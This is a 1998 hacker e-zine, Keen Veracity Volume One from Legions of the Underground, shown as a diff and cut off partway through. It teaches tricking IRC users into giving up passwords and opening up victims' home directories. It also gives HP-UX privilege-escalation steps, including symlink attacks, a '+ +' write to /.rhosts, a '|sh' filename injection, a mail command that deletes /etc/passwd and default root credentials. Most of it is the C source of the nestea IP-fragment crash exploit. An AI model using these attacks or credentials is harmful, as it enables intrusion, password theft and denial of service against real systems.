@@ -1,0 +1,2237 @@
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+*-*                      K e e n   V e r a c i t y                      *-*
+*-*                  Volume One (rev. 2) - April 1998                   *-*
+*-*                                                                     *-*
+*-*                     L e g i o n s   o f   t h e                     *-*
+*-*                        U n d e r g r o u n d                        *-*
+*-*                       http://www.legions.org                        *-*
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+C o n t e n t s:                                                /Z1#P10.01/
+
+          o-NEWS-o
+
+          * About                  - |          |- optiklenz
+          * ------------------------ |          |-
+          * Beach Con              - |          |- sync
+          * ------------------------ |          |-
+          * Phreak Zine            - |          |- optiklenz
+          * ------------------------ |          |-
+          * This Months Linkage    - |          |- LegionPhreak
+          * ------------------------ |          |-
+
+          o-IRC-o
+
+          * Irc Social Engineering - |*revisited|- optiklenz
+          * ------------------------ |          |-
+          * Legions Script         - |  BitchX  |- HyperLogik
+          * ------------------------ |          |-
+
+          o-Neophytes-o
+
+          * Basic Unix Commands    - |          |- optiklenz
+          * ------------------------ |          |-
+          * Exploits?              - |          |- miah
+          * ------------------------ |          |-
+
+          o-Security-o
+  
+          * HPUX Security Overview - | revised  |- tip
+          * ------------------------ |          |-
+          * HPUX Exploits Note     - |  bugs    |- optiklenz
+          * ------------------------ |          |-
+          * Nestea Exploit         - | advisory |- Dallion
+          * ------------------------ |          |-
+          * Infoseek               - | exploit  |- optiklenz
+          * ------------------------ |          |-
+          * Fake Mail              - | revised  |- optiklenz
+          * ------------------------ |          |-
+          * Wingate Exertion       - |          |- optiklenz
+          * ------------------------ |          |-
+          * backdoor.c             - |          |- jsbach
+          * ------------------------ |          |-
+          * IP Spoofing            - |          |- optiklenz
+          * ------------------------ |          |-
+	  * Anal Sniff             - |          |- chron1c
+          * ------------------------ |          |-
+          * Back Attack            - |          |- chrak
+          * ------------------------ |          |-
+          * Irix LMR               - |          |- optiklenz
+          * ------------------------ |          |-
+          * Securing Linux         - |          |- BlackIC
+          * ------------------------ |          |-
+          * FoolProof              - |          |- Duncan Silver
+          * ------------------------ |          |-
+
+          o-Misc-o
+  
+          * pnp56K Linux Setup     - |          |- mosoka
+          * ------------------------ |          |-
+          * Sniffer Log            - |          |- chrak
+          * ------------------------ |          |-
+
+          o-Comic Relief-o 
+
+          * Young Hackers, and Jail  |          |- Analyzer
+          * ------------------------ |          |-
+
+     ----------------------------------------------------------------------
+
+                      - { = - =  N  E  W  S  = - = } -
+
+  [ABOUT]-----------------------------------------------------| optiklenz |
+
+          This zine covers different aspects of computing. This month's
+          security focus is concentrated on the HP-UX platform. This 
+          month's guest editor is Analyzer.  Guest editors, along with
+          the topic the editor is writing on, will change monthly. 
+ 
+          Most of our articles, and zines for the past 6 years have been
+          distributed through bulletin board services.  Our own Electronic
+          Source, and Abyss BBS just to name a couple. This is actually our
+          first zine release being distro'd via the web.  We release a new
+          zine every month. If you would like to submit an article for the
+          next zine, send email to: webmaster@legions.org with the subject
+          matter of the article.  Also if there is a certain subject you'd
+          like to see written about in the next zine, please let us know.
+
+     (1)------------NEWS------------------------------------------------(1)
+
+  [Beach Con]------------------------------------------------------| sync |  
+
+          Last year's Legion Con's (Cyber Con) theme was "Network
+          Utilization."  This year, there will be a multiude of themes
+          which will range from mainstream security and cryptology, to
+          telephony and other types of electronic manipulation.
+
+     (2)------------NEWS------------------------------------------------(2)
+
+  [Phreak Zine]-----------------------------------------------| optiklenz |
+
+          We are currently working on our Phreak zine.  There is progess,
+          but production is going extremely slow, being that members are
+          currently occupied with their own activities.  An example of some
+          of the zine's content is listed below.
+ 
+               [o] Shadowing your ANI
+               [o] Detailing, and using a beige box
+               [o] ATT-CONF
+               [o] Phone Tapping
+               [o] Discreet frequencies
+               [o] Telenet #'s
+               [o] More...
+
+          Want to submit an article?  Mail webmaster@legions.org with
+          the article title first.  We will either "ok" it or decline it
+          depending on your article content, or if someone has already
+          choosen the same subject matter.
+
+     (3)------------NEWS------------------------------------------------(3)
+  
+  [Linkage]------------------------------------------------| LegionPhreak |
+
+          This Months Linkage:
+ 
+    They Finally Have a Static Layout  A UDDF.NET Production (www.uddf.net)
+    http://www.hackers.com             http://www.hackedsites.com
+    
+    Exploits Galore                    Beat Your Meat (It's Good for You)
+    http://www.rootshell.com           http://www.freshmeat.net
+
+    Rhino9                             Unix Guru
+    http://www.rhino9.com              http://www.ugu.com/
+
+          Link of the month: http://www.legions.org
+
+     (4)------------NEWS------------------------------------------------(4)
+
+                      - { = - =  I   R   C   = - = } -       
+
+  [Social Engineering]----------------------------------------| optiklenz |    
+                     
+          Gaining users' passwords via irc Method 1.
+                      
+          First, you need two irc clients open.  This method is
+          more authentic if you have operator status in the channel.
+          On one of the open clients, name yourself Bot, or something to
+          that effect, and on the other client use your regular nick. 
+          If someone is looking to get op's let them know that there is
+          a Bot in the channel, and if the user/users want ops they must
+          first identify themselves with the Bot using the '/msg Bot
+          identify password' command.  After you tell them this and leave
+          the room either way the passwd's will come rolling in. It's
+          less suspicious if you leave though, because people will think
+          damage can't be done if you're not there to do it.  On the
+          antithesis you are still there because you are the Bot just
+          sitting there collecting passwd's.  These passwd's are maybe for
+          their email account, website, and other things. So go back
+          later and ask the people that fell for it if they have a website,
+          or for their email address, etc, etc.
+
+     (5)------------IRC-------------------------------------------------(5)
+
+  [Legions Script]-------------------------------------------| Hyperlogik | 
+
+          Legions script for Linux is due out in a few weeks.
+          More info will be posted in the next zine.
+
+     (6)------------IRC-------------------------------------------------(6)
+
+               - { = - =  N  E  O  P  H  Y  T  E  S  = - = } - 
+ 
+    Note: The content of the neophytes section will grow more in-depth
+          every month.  Escalating from basic to median, and so on...
+  
+  [Basic Unix Commands]---------------------------------------| optiklenz |
+
+          who is on     shows who is logged on the system
+          write name    name equiv to the person you want
+                        to chat with (ctrl D exits chat mode)
+          EOT           End of Transfer
+          du -a         mem check
+          ps -pid user  kills a user
+          passwd        Change your users passwd
+          ls            List all files in a directory (ls -a)
+          telnet        start a telnet session
+          open          open a location
+          ftp           start file transfer session
+          find          Find a file
+          cd\dir        dir being sub-directory
+          netstat       See current processes running among
+                        your connection.
+          chgrp         Changes a file's group ownership
+          cat "file"    type contents try cat /etc/passwd
+
+          tcpdump       Packet sniffer, moniter packets
+                        in promniscious mode
+          rmdir         Deletes one or more directories
+          sleep         Causes a process to become inactive
+                        for a specified amount of time
+          sort          Sort and merge one or more files
+          spell         Finds spelling errors in a file
+          split         Divides a file
+          stty          Displays or set terminal parameters
+          tail          Displays the end of a file
+          troff         Outputs formatted output to a typesetter
+          tset          Sets other terminal type
+          unmask        Allows the user to specify a new creation
+                        mask
+          uucp          Unix-to-Unix copy
+          vi            Full screen editor
+          wc            Displays details in the file size
+          who           Displays information on the system users
+          write         Used to send a message to another user
+          ifconfig      To see the routing layout/destination
+                        of packets, etc.
+          gcc           Compile C based code
+          rm            delete file
+          mv            rename
+          bfs           Scans a large file
+          cal           Displays a calendar
+          mkdir         Create a directory
+          chmod         Assign File permissions
+                   TIP: If you have temp access to a system, chmod 777
+                        $home or chmod $email so you have access to their
+                        home directory, as well as their email later.
+
+     (7)------------NEOPHYTES-------------------------------------------(7)
+  
+  [Exploits]-------------------------------------------------------| miah |
+
+          A lot of people ask me about exploits, what they are, what they
+          do, and how they use them.  Well, I'm writing this document to
+          explain this for hopefully my last time. It's just starting to
+          bother me that I have to explain this everytime I'm on irc, so I
+          thought there should be a text explaining them.  Well, here it
+          is.
+
+          --- What is an 'exploit' ? ---
+
+          Well to explain this simply, an exploit is a program that
+          'exploits' a bug in a specific software.  All exploits are
+          different, they do different things, exploit different bugs,
+          etc.  That's why exploits are allways program specific.
+          Exploits are made to get root on different operating systems.
+          They achive this by exploiting a bug in software when the
+          software is running as root.  In UNIX type OS's, software may
+          have to run as root (or UID 0) in order to perform a specific
+          task that cannot be performed as another user. So basically the
+          exploit crashes the software while running as root to give you
+          the beautiful root prompt.
+
+          Well, now that I've answered questions one and two, I'm going
+          to move on to question 3.
+
+          --- How do I use an exploit? ---
+
+          Since exploits are coded in C 99% of the time, you need a shell
+          on the box you are going to use the exploit on, OR, you need to
+          be running the same OS as the box you are attempting to hack.
+          So basically, you need to put the source code, or the binary in
+          your shell accounts dir, (you want to use a hacked, or a shell
+          that's not yours for this :) ) to put it on your shell, you can
+          ftp to your account and upload it that way, or you can use rz
+          if you are using a dialup shell.  Either way, I shouldn't have
+          to explain those to things too much, it's pretty easy.
+
+          Once you have the exploit on the box, you just need to compile
+          it.  Usually you would compile the exploit like so:
+
+          blah:~/$gcc exploit.c
+
+          That should compile your exploit.  However, be aware that some
+          exploit coders are sneaky pests, and like to pick on people who
+          dont know C, so they will sometimes insert bugs into the
+          exploit, thus disabiling it to be compiled.  So it does help to
+          know C, when playing with C. :)
+
+          After the compiling is done, you should be able to just run the
+          exploit and its work will be done when you see the root prompt.
+          However, not all exploits are the same, and might require
+          different commandlines to get them to work.
+
+          --- Where can I get some exploits? ---
+
+          Well, two of the best places I have found for exploits are:
+
+          http://get.your.exploits.com and http://www.rootshell.com
+
+     (8)------------NEOPHYTES-------------------------------------------(8)
+
+                 - { = - =  S  E  C  U  R  I  T  Y  = - = } - 
+
+  [Hpux Security Overview]------------------------------------------| tip | 
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+HP-UX: A Security Overview, Part One                     revision02 17mar98
+                                                     http://www.legions.org
+---------------------------------------------------------------------------
+Table of Contents:
+
+1) Intro and Disclaimer                 5) The Trusted System
+2) HP-UX: an Overview                   6) Resources
+3) The Setup by Default                 7) Exploits
+4) HP-UX Security Measures              8) To Be Continued
+---------------------------------------------------------------------------
+1) Intro and Disclaimer
+
+a) This text is designed to complement to general Unix knowledge. All Unix
+   OS's are different in their own right. This text will delve into HP-UX-
+   specific areas. This is not a Unix tutorial, rather a supplement to
+   fundamental Unix hacking knowledge.
+b) This text will cover HP-UX version 10.x primarily. Specifically, 10.10
+   and 10.20 will be in mind. 11.0 has been released and I haven't gotten
+   to checking it out yet. 9.x is old, and no longer supported by HP. Thus,
+   the most logical choice (and most popular version of HP-UX) is 10.x.
+c) I'm not perfect; please notify me of any errors in the document. Also,
+   if you see anything you want added to this file, feel free to send them
+   to me.
+d) This text was written for educational purposes only.
+e) Thanks to HP, rootshell, and the various other hacker folks that have
+   helped me write this article. Special thanks to Colonel Panic for find-
+   ing many exploits, some of which I have used as examples. Shouts out to
+   my fellow LoU members, the SOD, and the Chicago crew.
+---------------------------------------------------------------------------
+2) HP-UX: an Overview
+
+   Largely based on SysV, Hewlett Packard's version of Unix, HP-UX, has un-
+dergone many changes and many version updates (current version is 11.0).
+While robust in many areas (ie, memory management, overall performance,
+etc), security leaves much to be desired. HP's vision of Unix seems to
+come from that of a closed network with non-malicious users (ie, /usr/local
+being world-writeable); only recently has the Internet been an explosion,
+and HP seems to be playing "catch up" to network and internal security.
+HP's solution to security problems have been patches. Lots of patches. You
+can see the patches on a system by typing "swlist -l product" (substitute
+"fileset" instead of "product" for more specific information. Patch and
+software information is stored in /var/adm/sw; so you can check out older
+pre-patched binaries there. As usual, system logs are kept in /var/adm
+(along with btmp, utmp, and wtmp).
+---------------------------------------------------------------------------
+3) The Setup by Default
+
+   By default, HP-UX is VERY insecure. Yes, most Unixes are (by default),
+but HP-UX even more so. Here is a brief following of what is insecure by
+default:
+o /usr/local and subdirectories are world writeable.
+o Many applications by default are installed as world writeable (ie,
+  measureware database module for oracle installs this way.
+o root's umask is set to: 02.
+o cue is installed (see section 6 for the exploit).
+o System is un-"Trusted." See section 4.
+o Direct login as root possible from all ttys (as result of being un-
+  "Trusted").
+o System logging is set pretty minimal (see /etc/syslog.conf); not that it
+  matters, as system logging is pretty minimal no matter how you have it.
+o /etc/logingroup non-existent. While this is not an insecurity, it's worth
+  mentioning.
+---------------------------------------------------------------------------
+4) HP-UX Security Measures
+
+o Suid scripts not possible
+   This is a popular trend in newer Unix OS's. Basically, if you have a
+suid script, it will not be run as root. Binaries are what's important.
+o Dialup passwords
+   You can set an additional password for a dialin device. If you dialed
+into an HP-UX server with dialup passwords enabled, you would enter your
+usual login and password, then an _additional_ dialup password. Each
+dialup password is dependant of the shell; the shell is used as the "login"
+field. To explain further, look at /etc/d_passwd:
+
+/bin/sh:qKrbuYLg9B2vU:0:0:::
+/bin/csh:4LcBNqYbmdp3Y:0:0:::
+/bin/ksh:zKanqUcdEzh3Q:0:0:::
+
+   What's important here are the first two fields (obviously). Two other
+things to note; Firstly, if the system is relatively secure, the "login"
+field can only be eight characters long. This creates a problem if your
+shell is "/usr/local/bin/tcsh" (19 chars). Thus, what's done is either: a
+link is created that is less than eight characters (ie, /bin/tsh -> /usr
+/local/bin/tcsh) or dialup passwords just aren't used. Secondly, the file
+to reference which tty the dialin is located is /etc/dialups:
+
+/dev/ttyd0p7
+
+   That's it. That's the format of the file.
+
+o lanscan and ioscan
+   Just a side note to the standard commands, ifconfig and netstat.
+lanscan will tell you what interface cards you have on the system, which
+are up or down, etc, etc. ioscan is similar, but covers the entire system,
+ie, hard drives, I/O adapters, memory, etc. Might be useful in getting more
+intimate with your system.
+---------------------------------------------------------------------------
+5) The Trusted System
+
+   What is a "Trusted System"? Check for a /tcb directory. The existence of
+a /tcb directory signifies that the system you're on is a "Trusted System."
+The conversion to this is done through /usr/sbin/sam by root. Here is what
+converting does to a system:
+o Pseudo-shadow password scheme (actually uses a "protected password
+  database").
+o A stricter password authentication system.
+o User auditing.
+o Access control lists (acls) [note: only supported under hfs, not vxfs]
+  [second note: being phased out].
+o Terminal and time-based access control.
+
+   Basically to put this all together, in the /tcb/files/auth directory,
+there are a number of subdirectories by capital and lowercase letters, ie,
+"e," "T," and so forth. This is the initial of the login. In that directory
+is a file per user. Thus, root's file would be /tcb/files/auth/r/root.
+What's in this file? It's basically like a password entry, with more
+fields. ie, /tcb/files/auth/r/root:
+
+root:u_name=root:u_id#0:\
+        :u_pwd=Z1Po84UVyBbGE:\
+        :u_bootauth:u_auditid#0:\
+        :u_auditflag#1:\
+        :u_pswduser=root:u_suclog#8895646615:u_lock@:chkent
+
+root's entry in /etc/passwd would then be:
+root:*:0:3:root:/:/sbin
+
+   If it isn't obvious, the login and user id of an /etc/passwd are there,
+along with additional information. The above example has only a few fields
+listed.
+
+The full contents of an HP-UX password database file would contain:
+a login and user id                 b encrypted password
+c account owner                     d single user mode boot flag
+e audit id and audit flag           f minimum time between password change
+                                      (not in example - u_minchg)
+g password max length               h password expiration time
+  (not in example - u_maxlen)         (not in example - u_exp)
+i password lifetime                 j time of last password change
+  (not in example - u_life)           (not in example - u_usucchg &
+                                       u_unsucchg)
+k absolute password expiration date l max time allowed between logins
+  (not in example - u_acct_expire)    (not in example - u_max_llogin)
+m max days before expiration when     before acct is locked
+  warning will appear               n user or system generated password?
+  (not in example - u_pw_expire_      (not in example - u_pickpw)
+   warning)
+o type of sys-ten passwords         p triviality check on user-gen
+  (not in example - u_genpwd)         (not in example - u_restrict)
+q can pick null password?           r userid of last person who changed
+  (not in example - u_nullpw)         this password (not in example -
+                                      u_pwchanger)
+s random # that user must supply    t can user generate random # for a
+  (given to him by the admin) when    password? (not in example -
+  password is reset (not in example   u_genchars)
+  - u_pwd_admin_num)
+u can user generate random letters  v time of day when user can login
+  for a password? (not in example     (not in example - u_tod)
+  - u_genletters)
+w time of last successful login     x time of last unsuccessful login
+  (not in example - u_suclog)          (not in example - u_unsuclog)
+y term or remote hosts from last    z number of unsuccessful logins, this
+  successful and unsuccessful logins  # clears upon a successful login
+  (not in example - u_suctty &        (not in example - u_numunsuclog)
+   u_unsuctty)
+1 max number of login attempts      2 account locked flag (not in example
+  before account is locked            - u_lock)
+  (not in example - u_maxtries)
+
+   In /tcb/files, in addition to auth, there are two files, devassign and
+ttys. devassign contains device access info and ttys contains term access
+info.
+
+Here are a few lines from devassign:
+console:v_devs=/dev/console:v_type=terminal:chkent:
+ttyp0:v_devs=/dev/ttyp0:v_type=terminal:chkent:
+ttyp1:v_devs=/dev/ttyp1:v_type=terminal:chkent:
+
+The format of this file contains:
+a device name                       b aliases to that device
+c device supported (ie, printer,    d users permitted on that device, if
+  terminal, tape, or remote)          not specified, all users may use it
+
+Here are a few lines from ttys:
+console:t_devname=console:t_maxtries#777:chkent:
+tty:t_devname=tty:chkent:
+tty00:t_devname=tty00:chkent:
+
+The above example only has a few fields listed. The full format of this
+file contains:
+a device name                       b last user (id) to log into that tty
+                                      (not in example - t_uid)
+c last successful login time        d last unsuccessful login time
+  (not in example - t_logtime)        (not in example - t_unsuctime)
+e number of consecutive logins      f terminal lock flag
+  before tty is locked
+
+   In all actuality, not many HP-UX systems are setup to be Trusted.
+Managing a password database and tweaking is more work than neccessary.
+In addition, remote commands are not possible on a Trusted System, unless
+it is done _from_ a Trusted System. Lastly, mapping files to sync /etc
+/passwd with /tcb/files/auth are contained in /tcb/files/auth/system.
+These are called pw_id_map, gr_id_map, and aid_id_map. It is very likely
+that these mapping files will get out of sync with the database files. The
+solution is removing them and letting them regenerate. However, all in all,
+having a Trusted System can prove to take as much maintanence as an un-
+Trusted System. It's really the admin's call. I've seen maybe about half
+and half these days.
+---------------------------------------------------------------------------
+6) Resources
+
+o  If you have a question about a patch, check out ftp://us-support.
+external.hp.com.  All the current patches are available there for your
+peruseal.
+
+o  http://www.rootshell.com, http://get.your.exploits.org, http://www.hha.
+net/hha/exploits, http://www.dhp.com/~fyodor/sploits_hpux.html: Very good
+sites with Unix and HP-UX-specific exploits. Both explanations and source
+code/scripts are available here.
+
+o  Usenet: comp.os.security.announce and comp.sys.hp.hpux: Sometimes
+regular updates of weaknesses. Avoid alt.2600 at all costs.
+
+o  And of course, the ever-so-handy man command.
+---------------------------------------------------------------------------
+7) Exploits
+
+   These are only a few of many. I only added a few, as I wanted to explain
+about HP-UX security in general. Part 2 will delve deeper into exploits
+(as well as auditing, system calls, and acls).
+
+o cue bug
+   The first thing after gaining access to an HP-UX system is to check if
+cue exists (typically in /usr/bin/cue). Make sure it's an suid binary
+(which it is by default). Simply set your umask to 000. Now start cue. In
+your home directory, do an ll. You'll see that the name of the file created
+by cue (in my case, it's called "IDMERROR.ttyp1") is owned by root. You'll
+also see that the umask follows and is world-writeable. Now exit cue.
+Remove the *ERROR* file created by cue. Think of a file like /etc/passwd or
+/.rhosts. Do an "ln -s /etc/passwd ~/IDMERROR.ttyp1" (or whatever suits
+your needs). Now start cue again. Exit it. You'll see that the root owned
+file that wasn't writeable by anyone not only is now truncated, but it has
+world write permission. Do whatever you want with it.
+
+o ftp mget bug
+   This won't do you much good if ftp isn't suid root (most likely it
+won't be), but this still works (not as root though). In /tmp, create a
+separate directory (we'll use "test"). cd to that directory and execute
+this command: echo "date > /tmp/BLAH" > "|sh". Notice that /tmp/BLAH does
+not exist. Now, ftp to localhost. cd to /tmp/test and do a "mget *".
+ftp that file. Now quit ftp and check for a /tmp/BLAH. It exists! cat it.
+Now what if ftp was suid root, and the echo command you used to create
+"|sh" was this: echo "chmod 777 /etc/passwd" > "|sh"?
+
+o Old SAM bug
+   Typically, when SAM (System Administration Manager) is being run by
+an admin, a temp file is created in /var/tmp. Newer, patched SAMs use
+arbitrary file names, ie OBAMDBAa01687 or aaaa01990, etc. But older SAMs
+used a consistent file name when writing this temp file. It was called:
+outdata. Since SAM is typically run as root, you'll see what I'm getting
+at here (duh, the temp file is owned by root). Simply create a link to a
+file, such as /etc/passwd to that temp file (ie, ln -s /etc/passwd /var
+/tmp/outdata). Now if root's umask is set to 000, then you'll own /etc
+/passwd next time the admin runs SAM. This trick is unlikely these days,
+as most SAMs are patched and most admins don't use umask 000 on root.
+
+o Old SAM bug 2
+   On older versions of SAM, a user named sam_exec was created with uid 0.
+The default password for this on 10.x is: x7vpa5jh
+   Simply login as sam_exec, and hit control-c right away for a shell.
+
+o ppl bug
+   Another symbolic link exploit. ppl's log file is: /var/ppl/log. Now,
+you can simply remove or move this (so that /var/ppl/log is non-existent;
+also /var/ppl is world-writeable on default, thus you can do this). This
+log file is owned by root (ppl is an suid program). Next, think of a file
+that you'd like to nuke and own (if you don't want to get caught, try
+/.rhosts instead of something like /etc/passwd; in addition, save the old
+/var/ppl/log somewhere to put back when you're done). Now do a: ln -s
+/.rhosts /var/ppl/log. Then type:
+ppl -o '\
++ +
+'
+or whatever you want to place in /.rhosts. You get the drift. Now you can
+remove /var/ppl/log and put the old one back in place. You can now rlogin
+as root.
+
+o Educational Centers
+   HP's educational centers are protected mainly by firewalls. But if you
+happen to get in, the root password on nearly all machines is simply: hp.
+---------------------------------------------------------------------------
+8) To Be Continued
+   Part Two will delve deeper into the Trusted System, specifically cover-
+ing auditing and acls. Exploits will also be covered in greater detail.
+---------------------------------------------------------------------------
+(c) 1998 tip of Legions of the Underground       http://www.legions.org
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+     (9)------------SECURITY--------------------------------------------(9)
+
+  [Hpux Exploits Note]----------------------------------------| optiklenz |
+
+          HP_UX     versions 1.2&13.1 sm, -oQ  ==> can read/write any file
+          5.57      from:<"|/bin/rm /etc/passwd">  && bounce mail....
+          HPUX <7.0     1--    chfn -- allows newlines, etc ()
+          HP-UX         1--    sendmail:  mail directly to programs ()
+          HPUX A.09.01  1--    sendmail:  mail directly to programs ()
+
+       1) libXt: This is a widely known security hole that allows local
+          users to gain root access via setuid X programs like xterm or
+          xload.  A recommendation is to replace the guilty libraries by
+          applying X/Motif "jumbo" patches, which is a good thing anyway.
+
+       2) sendmail: Yet another sendmail hole.  The best solution at CERN
+          is maybe to use the public domain version of sendmail (used by
+          default on all HP-UX 10.20 systems) that does not seem
+          vulnerable.
+
+     (10)-----------SECURITY-------------------------------------------(10)
+
+  [Nesta Exploit]-----------------------------------------------| Dallion |
+
+          ---------------------------------------------------------
+          Note: Nestea by humble\nCode ripped from teardrop by route
+          ---------------------------------------------------------
+          Basically crashes a machine using "off by one" IP headers.  Like
+          boink and land reversed.  It's a total rip (the code that is)
+          but it works, none the less.  I have tested it on machines
+          running Linux kernels 2.0.33 and 2.1.95 both machines went
+          slamming down when I hit them.  I like this toy. :)  To fix it:
+
+       1) If you do packet filtering, set it to filter off by one IP
+          headers
+       2) Fix your kernel to not process these packets.
+
+        - Dallion Dalson
+
+        Here is the exploit:
+
+01. nestea.c - exploits the "off by one IP header" bug in Linux
+
+// nestea.c by humble of rhino9 4/16/98
+// This exploits the "off by one IP header" bug in the Linux IP frag code.
+// Crashes Linux 2.0.* and 2.1.*  and some Windows boxes
+// this code is a total rip of teardrop - it's messy
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <netinet/udp.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/socket.h>
+
+// bsd usage is currently broken because of socket options on the third sendto
+
+#ifdef STRANGE_BSD_BYTE_ORDERING_THING
+                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi <
+3.0 */
+#define FIX(n)  (n)
+#else                   /* OpenBSD 2.1, all Linux */
+#define FIX(n)  htons(n)
+#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */
+
+#define IP_MF   0x2000  /* More IP fragment en route */
+#define IPH     0x14    /* IP header size */
+#define UDPH    0x8     /* UDP header size */
+#define MAGIC2  108
+#define PADDING 256    /* datagram frame padding for first packet */
+#define COUNT   500    /* we are overwriting a small number of bytes we 
+                        shouldnt have access to in the kernel. 
+                        to be safe, we should hit them till they die :>  */
+
+void usage(u_char *);
+u_long name_resolve(u_char *);
+u_short in_cksum(u_short *, int);
+void send_frags(int, u_long, u_long, u_short, u_short);
+
+int main(int argc, char **argv)
+{
+    int one = 1, count = 0, i, rip_sock;
+    u_long  src_ip = 0, dst_ip = 0;
+    u_short src_prt = 0, dst_prt = 0;
+    struct in_addr addr;
+
+    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
+    {
+        perror("raw socket");
+        exit(1);
+    }
+    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one,
+sizeof(one))
+        < 0)
+    {
+        perror("IP_HDRINCL");
+        exit(1);
+    }
+    if (argc < 3) usage(argv[0]);
+    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip =
+name_resolve(argv[2])))
+    {
+        fprintf(stderr, "What the hell kind of IP address is that?\n");
+        exit(1);
+    }
+
+    while ((i = getopt(argc, argv, "s:t:n:")) != EOF)
+    {
+        switch (i)
+        {
+            case 's':               /* source port (should be emphemeral) */
+                src_prt = (u_short)atoi(optarg);
+                break;
+            case 't':               /* dest port (DNS, anyone?) */
+                dst_prt = (u_short)atoi(optarg);
+                break;
+            case 'n':               /* number to send */
+                count   = atoi(optarg);
+                break;
+            default :
+                usage(argv[0]);
+                break;              /* NOTREACHED */
+        }
+    }
+    srandom((unsigned)(time((time_t)0)));
+    if (!src_prt) src_prt = (random() % 0xffff);
+    if (!dst_prt) dst_prt = (random() % 0xffff);
+    if (!count)   count   = COUNT;
+
+    fprintf(stderr, "Nestea by humble\nCode ripped from teardrop by route /
+daemon9\n");
+    fprintf(stderr, "Death on flaxen wings (yet again):\n");
+    addr.s_addr = src_ip;
+    fprintf(stderr, "From: %15s.%5d\n", inet_ntoa(addr), src_prt);
+    addr.s_addr = dst_ip;
+    fprintf(stderr, "  To: %15s.%5d\n", inet_ntoa(addr), dst_prt);
+    fprintf(stderr, " Amt: %5d\n", count);
+    fprintf(stderr, "[ ");
+
+    for (i = 0; i < count; i++)
+    {
+        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);
+        fprintf(stderr, "b00m ");
+        usleep(500);
+    }
+    fprintf(stderr, "]\n");
+    return (0);
+}
+
+void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
+                u_short dst_prt)
+{
+int i;
+    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */
+    u_char byte;                            /* a byte */
+    struct sockaddr_in sin;                 /* socket protocol structure */
+
+    sin.sin_family      = AF_INET;
+    sin.sin_port        = src_prt;
+    sin.sin_addr.s_addr = dst_ip;
+
+    packet = (u_char *)malloc(IPH + UDPH + PADDING+40);
+    p_ptr  = packet;
+    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);
+
+    byte = 0x45;                        /* IP version and header length */
+    memcpy(p_ptr, &byte, sizeof(u_char));
+    p_ptr += 2;                         /* IP TOS (skipped) */
+    *((u_short *)p_ptr) = FIX(IPH + UDPH + 10);    /* total length */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(242);   /* IP id */
+    p_ptr += 2;
+    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
+    byte = IPPROTO_UDP;
+    memcpy(p_ptr + 1, &byte, sizeof(u_char));
+    p_ptr += 4;                         /* IP checksum filled in by kernel */
+    *((u_long *)p_ptr) = src_ip;        /* IP source address */
+    p_ptr += 4;
+    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
+    p_ptr += 4;
+    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(8 + 10);   /* UDP total length */
+
+    if (sendto(sock, packet, IPH + UDPH + 10, 0, (struct sockaddr *)&sin,
+                sizeof(struct sockaddr)) == -1)
+    {
+        perror("\nsendto");
+        free(packet);
+        exit(1);
+    }
+
+    p_ptr  = packet;
+    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);
+
+    byte = 0x45;                        /* IP version and header length */
+    memcpy(p_ptr, &byte, sizeof(u_char));
+    p_ptr += 2;                         /* IP TOS (skipped) */
+    *((u_short *)p_ptr) = FIX(IPH + UDPH + MAGIC2);    /* total length */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(242);   /* IP id */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = FIX(6);  /* IP frag flags and offset */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = 0x40;         /* IP TTL */
+    byte = IPPROTO_UDP;
+    memcpy(p_ptr + 1, &byte, sizeof(u_char));
+    p_ptr += 4;                         /* IP checksum filled in by kernel */
+    *((u_long *)p_ptr) = src_ip;        /* IP source address */
+    p_ptr += 4;
+    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */
+    p_ptr += 4;
+    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */
+    p_ptr += 2;
+    *((u_short *)p_ptr) = htons(8 + MAGIC2);   /* UDP total length */
+
+    if (sendto(sock, packet, IPH + UDPH + MAGIC2, 0, (struct sockaddr *)&sin,
+                sizeof(struct sockaddr)) == -1)
+    {
+        perror("\nsendto");
+        free(packet);
+        exit(1);
+    }
+
+    p_ptr  = packet;
+    bzero((u_char *)p_ptr, IPH + UDPH + PADDING+40);
+    byte = 0x4F;                        /* IP version and header length */
+    memcpy(p_ptr, &byte, sizeof(u_char));
+    p_ptr += 2;                         /* IP TOS (skipped) */
+    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING+40);    /* total length */
+    p_ptr += 2;
